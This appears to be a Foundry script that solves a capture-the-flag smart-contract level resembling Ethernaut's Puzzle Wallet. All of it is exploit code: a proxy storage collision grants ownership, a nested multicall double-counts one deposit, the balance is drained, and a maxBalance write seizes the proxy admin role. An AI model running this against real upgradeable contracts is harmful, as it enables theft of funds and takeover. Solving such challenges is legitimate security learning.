// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IDex {
    function swap(address, address , uint ) external;
    function approve(address, uint) external;
    function token1() external returns(address);
    function token2() external returns(address);
    function balanceOf(address, address) external returns(uint);
}

interface PuzzleWallet {
    function owner() external;
    function maxBalance() external;

    function init(uint256) external;

    function setMaxBalance(uint256) external;

    function addToWhitelist(address addr) external; 

    function deposit() external payable;

    function execute(address to, uint256 value, bytes calldata data) external payable;

    function multicall(bytes[] calldata data) external payable;
}

interface PuzzleProxy {
    function pendingAdmin() external;
    function admin() external;

    function proposeNewAdmin(address _newAdmin) external;

    function approveNewAdmin(address _expectedAdmin) external;

    function upgradeTo(address _newImplementation) external;
}

contract DEX is Script {

    PuzzleWallet wallet = PuzzleWallet(0xD2C85140c1278DAac0efbAc9CA4cdf2d98bbC4BA);
    PuzzleProxy px = PuzzleProxy(0xD2C85140c1278DAac0efbAc9CA4cdf2d98bbC4BA);

    function run() external{
        uint256 deployerPrivateKey = vm.envUint("pvt_key");
        vm.startBroadcast(deployerPrivateKey);

        //creating encoded function data to pass into multicall
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);
        
        address myAddress = 0xFA9e6f9049fF9874fa6C1Ea72C9E96285f2AEE3a;

        px.proposeNewAdmin(myAddress);
        console.log("msg.sender", msg.sender);
        wallet.addToWhitelist(myAddress);
        wallet.multicall{value: 0.001 ether}(nestedMulticall);
        wallet.execute(myAddress, 0.002 ether, "");
        wallet.setMaxBalance(uint256(uint160(myAddress)));

        vm.stopBroadcast();
    }
}